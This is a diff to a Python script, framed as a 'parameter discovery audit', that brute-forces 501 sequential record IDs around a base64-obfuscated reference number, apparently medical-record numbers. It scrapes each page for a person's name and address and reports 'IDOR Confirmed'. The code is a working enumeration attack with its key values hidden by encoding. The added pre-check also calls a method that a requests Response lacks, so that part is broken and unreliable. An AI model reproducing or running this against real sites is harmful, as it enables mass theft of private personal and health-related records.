@@ -190,19 +190,35 @@ def parameter_discovery_audit():
                     # 2. Automated Manipulation Test
                     print(f"[*] Executing Automated Discovery (Searching for valid record)...")
                     
+                    # Pre-Check: Cek apakah halaman ini memiliki struktur yang bisa di-ekstrak
+                    print(f"[*] Pre-checking URL structure...")
+                    check_res = session.get(base_url, timeout=5)
+                    if not check_res.find(_decode("c2FsZS1wcmljZQ==")): # sale-price
+                        print(f"[\033[93m!\033[0m] Warning: Endpoint ini mungkin tidak memiliki data Nama/Alamat.")
+                        confirm = input("[?] Tetap lanjutkan pemindaian 501 ID? (y/n): ")
+                        if confirm.lower() != 'y': break
+
                     # Persiapkan rentang tepat 501 ID (250 sebelum, 1 acuan, 250 sesudah)
                     acuan_rm = int(_decode("MDA1MTA0ODE="))
                     search_pool = list(range(acuan_rm - int(_decode("MjUw")), acuan_rm + int(_decode("MjUx"))))
                     random.shuffle(search_pool)
                     
                     found_event = threading.Event()
+                    checked_count = 0
 
                     def check_id_vulnerability(val):
+                        nonlocal checked_count
                         if found_event.is_set(): return
                         test_id = str(val).zfill(int(_decode("MTI=")))
                         test_url = base_url.replace(original_id, test_id)
                         try:
-                            test_res = session.get(test_url, timeout=10)
+                            # Gunakan timeout lebih pendek (5s) untuk discovery agar tidak macet
+                            test_res = session.get(test_url, timeout=5, allow_redirects=False)
+                            with lock:
+                                checked_count += 1
+                                if checked_count % 10 == 0:
+                                    print(f"    [*] Progress: {checked_count}/501 IDs tested...", end='\r')
+                            
                             test_soup = BeautifulSoup(test_res.text, 'html.parser')
                             name, address = "Unknown", "Tidak Ditemukan"
                             
@@ -221,12 +237,12 @@ def parameter_discovery_audit():
                                         found_event.set()
                                         mid = len(test_id) // 2
                                         m_rm = f"{test_id[:2]}{'*' * (mid - 2)}{test_id[mid]}{'*' * (len(test_id) - mid - 2)}{test_id[-1]}"
-                                        m_name = f"{name[:2].upper()}...{name[-1:].upper()}" if len(name) > 3 else name.upper()
-                                        m_addr = f"{address[:2].upper()}...{address[-1:].upper()}" if len(address) > 3 else address.upper()
+                                        m_name = f"{name[:2].upper()}**{name[-1:].upper()}" if len(name) > 3 else name.upper()
+                                        m_addr = f"{address[:2].upper()}**{address[-1:].upper()}" if len(address) > 3 else address.upper()
                                         print(f"\n\n[\033[92m✓\033[0m] Manipulation Test Result: \033[92mSUCCESS\033[0m")
                                         print(f" [!] No. RM      : {m_rm}")
-                                        print(f" [!] {_decode('TmFtYQ==')}        : {m_name}")
-                                        print(f" [!] {_decode('QWxhbWF0')}      : {m_addr}")
+                                        print(f" [!] {_decode('TmFtYQ==')}: {m_name}")
+                                        print(f" [!] {_decode('QWxhbWF0')}: {m_addr}")
                                         print(f" [!] {_decode('U3RhdHVz')}      : \033[91m{_decode('SURPUiBDb25maXJtZWQ=')}\033[0m")
                         except: pass
 
